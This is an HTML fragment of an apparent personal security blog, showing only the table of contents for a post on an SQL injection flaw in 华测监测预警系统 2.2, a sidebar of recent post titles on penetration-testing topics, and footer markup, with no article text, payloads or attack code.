href="#%E5%8D%8E%E6%B5%8B%E7%9B%91%E6%B5%8B%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F2-2-SQL-injection-vulnerability-exists"><span class="toc-number">1.</span> <span class="toc-text">华测监测预警系统2.2 SQL injection vulnerability exists</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Description"><span class="toc-number">1.1.</span> <span class="toc-text">Vulnerability Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-point-details"><span class="toc-number">1.2.</span> <span class="toc-text">Vulnerability point details</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Script-batch-validation"><span class="toc-number">1.3.</span> <span class="toc-text">Script batch validation</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/05/%E5%8D%8E%E6%B5%8B%E7%9B%91%E6%B5%8B%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F2.2%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="CVE Application - SQL Injection">CVE Application - SQL Injection</a><time datetime="2024-01-05T07:02:41.000Z" title="发表于 2024-01-05 15:02:41">2024-01-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/05/%E5%8D%8E%E6%B5%8B%E7%9B%91%E6%B5%8B%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F2.2%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E_2/" title="CVE Application - SQL Injection-2">CVE Application - SQL Injection-2</a><time datetime="2024-01-05T07:02:41.000Z" title="发表于 2024-01-05 15:02:41">2024-01-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/12/Vuln-stack%203/" title="VulnStack Pass-3">VulnStack Pass-3</a><time datetime="2023-11-12T07:02:41.000Z" title="发表于 2023-11-12 15:02:41">2023-11-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/08/PTH%E3%80%81PTK%E3%80%81PTT%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/" title="PTH、PTT、PTK 攻击总结">PTH、PTT、PTK 攻击总结</a><time datetime="2023-11-08T14:10:41.000Z" title="发表于 2023-11-08 22:10:41">2023-11-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/04/php-SER-libs%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98/" title="php-SER-libs靶场">php-SER-libs靶场</a><time datetime="2023-11-04T02:10:41.000Z" title="发表于 2023-11-04 10:10:41">2023-11-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Drblack</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
